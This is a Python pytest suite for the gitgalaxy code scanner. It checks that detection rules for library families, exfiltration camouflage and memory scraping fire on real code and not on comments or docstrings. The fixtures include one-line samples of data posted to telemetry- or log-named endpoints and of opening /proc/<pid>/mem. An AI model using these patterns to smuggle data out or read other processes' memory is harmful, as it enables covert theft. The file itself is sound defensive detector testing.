"""SOP-002-v1 gap-cell decoy suite for Python (#8863).

Protocol: docs/agents/decoy-spec-protocol.md (SOP-002-v1)
Covers the 11 python code-stream families that had a rule but no decoy row:
cryptography, dl_frameworks, encapsulation, exfiltration_camouflage, hardware_bridge,
llm_api, llm_orchestrator, llm_vector_store, memory_scraping, ml_traditional, scientific.
This is not a full-language graduation; the other python families keep their SOP-001-v1 rows.

Comment forms (Python Language Reference 2.1.3): `#` to end of line is the only comment form
(whole-line, consecutive lines, and inline trailing). Python has no block comment. Docstrings
are string literals, not comments; the test below records what the pipeline does with them
(today their content reads 0 for every covered family).
"""

from __future__ import annotations

import json
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "tools"))
import family_decoy_runner as fdr
import family_validity_chart as fvc

from gitgalaxy.core.detector import StructuralExtractor
from gitgalaxy.core.prism import Prism
from gitgalaxy.standards.gitgalaxy_config import LEXICAL_FAMILY_HEURISTICS
from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS

_LANG = "python"
_PRISM = Prism(LEXICAL_FAMILY_HEURISTICS, LANGUAGE_DEFINITIONS)
_EXTRACTOR = StructuralExtractor(_LANG, LANGUAGE_DEFINITIONS)
_BASELINE = Path(__file__).resolve().parents[1] / "family_validity_baseline.json"
_ISSUE = "https://github.com/squid-protocol/gitgalaxy/issues/"


def _hits(family: str, src: str) -> int:
    ref = _PRISM.split_streams(src, _LANG)
    res = _EXTRACTOR.splice(
        code_stream=ref["code_stream"],
        comment_stream=ref["comment_stream"],
        raw_content=src,
    )
    return int((res.get("equations") or {}).get(family, 0))


# Req C / G1: one authentic positive control per gap cell (single line, so every comment form wraps it whole).
PY_FAMILIES: dict[str, str] = {
    "cryptography": "from cryptography.fernet import Fernet",
    "dl_frameworks": "import torch",
    "encapsulation": "def _helper(x): return x",
    "exfiltration_camouflage": 'requests.post("https://collector.example.com/telemetry", json=payload)',
    "hardware_bridge": "import serial",
    "llm_api": "from openai import OpenAI",
    "llm_orchestrator": "from langchain_core.prompts import ChatPromptTemplate",
    "llm_vector_store": "import chromadb",
    "memory_scraping": 'mem = open("/proc/" + str(pid) + "/mem", "rb")',
    "ml_traditional": "from sklearn.linear_model import LogisticRegression",
    "scientific": "import numpy as np",
}

# G6: does the snippet's text inside a one-line string literal count today (strings count by design, #2535)?
# The import-anchored families need statement position, so a string never reaches it; the unanchored ones count.
PY_STRING_COUNTS: dict[str, bool] = {
    "cryptography": False,
    "dl_frameworks": False,
    "encapsulation": False,
    "exfiltration_camouflage": True,
    "hardware_bridge": False,
    "llm_api": False,
    "llm_orchestrator": False,
    "llm_vector_store": False,
    "memory_scraping": True,
    "ml_traditional": False,
    "scientific": True,
}

# Every module name in each import-anchored rule's alternation (Req B branches).
PY_IMPORT_BRANCHES: dict[str, tuple[str, ...]] = {
    "cryptography": (
        "cryptography",
        "OpenSSL",
        "crypto",
        "bcrypt",
        "x509",
        "tls",
        "ssl",
        "jsonwebtoken",
        "argon2",
        "hashlib",
        "hmac",
    ),
    "dl_frameworks": (
        "tensorflow",
        "torch",
        "keras",
        "transformers",
        "torchvision",
        "torchaudio",
        "torchtext",
        "tensorflow_hub",
        "tensorflow_datasets",
        "tensorflow_text",
    ),
    "hardware_bridge": (
        "serialport",
        "serial",
        "pyserial",
        "usb",
        "bluetooth",
        "bleak",
        "websocket",
        "printer",
        "webgl",
        "smbus",
        "smbus2",
        "spidev",
        "RPi",
        "gpiozero",
        "pigpio",
    ),
    "llm_api": ("openai", "anthropic", "langchain_openai", "langchain_anthropic"),
    "llm_orchestrator": (
        "langchain",
        "langchain_core",
        "llama_index",
        "langgraph",
        "crewai",
        "autogen",
        "haystack",
        "semantic_kernel",
        "dspy",
        "pydantic_ai",
        "smolagents",
    ),
    "llm_vector_store": ("chromadb", "pinecone"),
    "ml_traditional": ("sklearn", "xgboost", "lightgbm", "catboost"),
}

_IMPORT_BRANCH_CASES = [(fam, mod) for fam, mods in sorted(PY_IMPORT_BRANCHES.items()) for mod in mods]


def test_python_gap_families_are_defined_code_stream_families():
    families, _, defined = fvc.engine_grid()
    code_fams = (defined[_LANG] & {f.key for f in families}) - fdr.NON_DECOY_FAMILIES
    assert set(PY_FAMILIES) <= code_fams
    assert set(PY_STRING_COUNTS) == set(PY_FAMILIES)


def test_python_baseline_has_sop002_row_per_gap_family():
    decoys = json.loads(_BASELINE.read_text(encoding="utf-8"))["decoys"][_LANG]
    for fam in PY_FAMILIES:
        row = decoys.get(fam)
        assert row is not None, f"no baseline decoy row for python.{fam}"
        assert row["protocol"] == "SOP-002-v1"
        assert row["corpus"] == "decoy-spec"
        assert row["string_counts"] is PY_STRING_COUNTS[fam]


@pytest.mark.parametrize(("family", "snippet"), sorted(PY_FAMILIES.items()))
def test_python_positive_control_and_comment_forms(family: str, snippet: str):
    # G1: positive control
    assert _hits(family, snippet + "\n") >= 1, f"G1 failed for python.{family}: {snippet!r}"
    # G2 (Req A): whole-line `#` comment, with and without a space, and as consecutive lines
    assert _hits(family, f"# {snippet}\n") == 0
    assert _hits(family, f"#{snippet}\n") == 0
    assert _hits(family, f"#\n# {snippet}\n# {snippet}\n") == 0
    # G2: indented `#` comment inside a block
    assert _hits(family, f"if True:\n    # {snippet}\n    pass\n") == 0
    # G4: inline trailing `#` comment adds nothing over its prefix
    assert _hits(family, f"x = 1  # {snippet}\n") <= _hits(family, "x = 1  # SENTINEL_NOOP\n")


@pytest.mark.parametrize(("family", "snippet"), sorted(PY_FAMILIES.items()))
def test_python_docstrings_read_zero(family: str, snippet: str):
    """Docstrings are string literals, not comments. Recorded behaviour: their content reads 0 (module, function and
    doctest `>>>` forms), because the pipeline routes docstrings out of the code stream."""
    assert _hits(family, f'"""\n{snippet}\n"""\n') == 0
    assert _hits(family, f"'''{snippet}'''\n") == 0
    assert _hits(family, f'def f():\n    """Doc.\n\n    >>> {snippet}\n    """\n') == 0


@pytest.mark.parametrize(("family", "snippet"), sorted(PY_FAMILIES.items()))
def test_python_string_literal_and_string_comment_boundary(family: str, snippet: str):
    # G6: the snippet inside a one-line string literal; assert today's behaviour (#2535).
    quoted = snippet.replace('"', "'")
    got = _hits(family, f's = "{quoted}"\n')
    assert (got >= 1) is PY_STRING_COUNTS[family], f"python.{family} string count changed: {got}"
    # G6b: comment markers and URLs inside a string do not hide or open a comment
    for prefix in ('s = "http://x"', "s = 'a \\' b'", 's = "#"', 's = """x"""'):
        assert _hits(family, f"{prefix}  # {snippet}\n") <= _hits(family, f"{prefix}  # SENTINEL_NOOP\n")
    # a `#` inside a string does not start a comment: the statement after it still counts
    if family in PY_IMPORT_BRANCHES or family == "scientific":
        assert _hits(family, f's = "#"; {snippet}\n') >= 1


@pytest.mark.parametrize(("family", "module"), _IMPORT_BRANCH_CASES)
def test_python_import_branch_positive_and_boundaries(family: str, module: str):
    """Req B over every module name of the import-anchored rules."""
    assert _hits(family, f"import {module}\n") >= 1
    assert _hits(family, f"from {module} import x\n") >= 1
    assert _hits(family, f"import os, {module}\n") >= 1
    # bare-word branch embedded in a longer identifier
    assert _hits(family, f"import my_{module}_val\n") == 0
    assert _hits(family, f"from my_{module}_val import x\n") == 0
    if not (family == "llm_orchestrator" and module.startswith("langchain_")):
        # (llm_orchestrator's `langchain(?:_\w+)?` arm counts every `langchain_*` package by design)
        assert _hits(family, f"import {module}x\n") == 0
    assert _hits(family, f"my_{module}_val = 1\n") == 0
    # qualified prefix: the module as a submodule of another package
    assert _hits(family, f"import pkg.my_{module}\n") == 0


@pytest.mark.parametrize(
    ("family", "use_src"),
    [
        # Req D: "one hit per import statement, none for a use of the imported name" (signal_contracts.py)
        ("dl_frameworks", "x = torch.tensor([1.0])\n"),
        ("llm_api", "client = openai.OpenAI()\n"),
        ("llm_orchestrator", "chain = langchain.chains.LLMChain(llm=llm)\n"),
        ("llm_vector_store", "client = chromadb.Client()\n"),
        ("ml_traditional", "model = sklearn.linear_model.LogisticRegression()\n"),
        ("cryptography", 'digest = hashlib.sha256(b"x").hexdigest()\n'),
        ("hardware_bridge", 'port = serial.Serial("/dev/ttyUSB0")\n'),
        # an alias that merely happens to be a library name is not an import of that library
        ("dl_frameworks", "import numpy as torch\n"),
        # a different library whose name starts with a listed one
        ("hardware_bridge", "import serializers\n"),
        ("dl_frameworks", "from torch_utils_local import x\n"),
    ],
)
def test_python_import_family_negative_controls(family: str, use_src: str):
    assert _hits(family, use_src) == 0


# --- encapsulation: declaration-position markers only (docs/encapsulation_rule_contract.md) ---


@pytest.mark.parametrize(
    "src",
    [
        "def _helper(x): return x\n",
        "async def _run(): pass\n",
        "class _Impl: pass\n",
        "_cache = {}\n",
        "class A:\n    def __init__(self):\n        self._x = 1\n",
    ],
)
def test_python_encapsulation_every_branch_fires(src: str):
    assert _hits("encapsulation", src) >= 1


@pytest.mark.parametrize(
    "src",
    [
        # dunders are excluded (contract C1)
        "def __init__(self): pass\n",
        "__all__ = ['a']\n",
        "self.__dict__ = {}\n",
        # the throwaway name and a local are not module-level private declarations
        "_ = compute()\n",
        "def f():\n    _local = 1\n",
        # uses and comparisons, not declarations
        "x = self._y\n",
        "self._x == 1\n",
        "obj._x = 1\n",
        # names that do not start with an underscore
        "def my_helper(): pass\n",
        "class Impl_: pass\n",
    ],
)
def test_python_encapsulation_negative_controls(src: str):
    assert _hits("encapsulation", src) == 0


@pytest.mark.xfail(strict=True, reason=_ISSUE + "9454")
def test_python_encapsulation_self_has_left_boundary():
    assert _hits("encapsulation", "myself._x = 1\n") == 0


# --- exfiltration_camouflage ---


@pytest.mark.parametrize(
    "src",
    [
        'requests.post("https://x.io/checkmarx", data=d)\n',
        'requests.post("https://x.io/telemetry", data=d)\n',
        'requests.post("https://x.io/metrics", data=d)\n',
        'httpx.post("https://x.io/audit", json=d)\n',
        'requests.post("https://x.io/log", data=d)\n',
    ],
)
def test_python_exfiltration_every_branch_fires(src: str):
    assert _hits("exfiltration_camouflage", src) >= 1


@pytest.mark.parametrize(
    "src",
    [
        # qualified-branch prefixes
        'my_requests.post("https://x/telemetry")\n',
        'myrequests.post("https://x/log")\n',
        'myhttpx.post("https://x/metrics")\n',
        'requests.post_json("https://x/telemetry")\n',
        # Req D: a GET is not an outbound send, and `login` is not log-shaped
        'requests.get("https://x/telemetry")\n',
        'requests.post("https://x.io/login")\n',
    ],
)
def test_python_exfiltration_boundaries(src: str):
    assert _hits("exfiltration_camouflage", src) == 0


@pytest.mark.xfail(strict=True, reason=_ISSUE + "9455")
@pytest.mark.parametrize(
    "src",
    [
        'requests.post("https://x.io/blog")\n',
        'requests.post("https://x.io/changelog")\n',
        "requests.post(url_catalog)\n",
    ],
)
def test_python_exfiltration_keyword_left_boundary(src: str):
    assert _hits("exfiltration_camouflage", src) == 0


@pytest.mark.xfail(strict=True, reason=_ISSUE + "9456")
def test_python_exfiltration_urllib_request_branch_reachable():
    assert _hits("exfiltration_camouflage", 'urllib.request.urlopen("https://x.io/telemetry", data=body)\n') >= 1


# --- memory_scraping ---


@pytest.mark.parametrize(
    "src",
    [
        'f = open("/proc/" + str(pid) + "/mem", "rb")\n',
        'f = open("/proc/" + f"{pid}" + "/mem", "rb")\n',
        'f = open("/proc/1/mem", "rb")\n',
    ],
)
def test_python_memory_scraping_every_branch_fires(src: str):
    assert _hits("memory_scraping", src) >= 1


@pytest.mark.parametrize(
    "src",
    [
        # Req D: system memory statistics and a process's status file are not another process's memory image
        'f = open("/proc/meminfo")\n',
        'f = open("/proc/self/status")\n',
    ],
)
def test_python_memory_scraping_negative_controls(src: str):
    assert _hits("memory_scraping", src) == 0


@pytest.mark.xfail(strict=True, reason=_ISSUE + "9460")
@pytest.mark.parametrize("src", ['p = "/proc/" + str(pid) + "/cmdline"\n', 'p = "/proc/" + str(pid) + "/status"\n'])
def test_python_memory_scraping_concat_needs_mem(src: str):
    assert _hits("memory_scraping", src) == 0


# --- scientific ---


@pytest.mark.parametrize(
    "src",
    [
        "import numpy as np\n",
        "from pandas import DataFrame\n",
        "import scipy\n",
        "import matplotlib.pyplot as plt\n",
        "import cv2\n",
    ],
)
def test_python_scientific_every_branch_fires(src: str):
    assert _hits("scientific", src) >= 1


@pytest.mark.parametrize(
    "src",
    [
        "x = my_numpy_val\n",
        "import my_scipy_val\n",
        "import numpy_financial\n",
        "import numpyro\n",
        'raise ValueError("bad") from pandas_err\n',
    ],
)
def test_python_scientific_boundaries(src: str):
    assert _hits("scientific", src) == 0


@pytest.mark.xfail(strict=True, reason=_ISSUE + "9453")
@pytest.mark.parametrize("src", ["import my_numpy\n", "from mypandas import x\n", "import my_cv2\n"])
def test_python_scientific_library_left_boundary(src: str):
    assert _hits("scientific", src) == 0
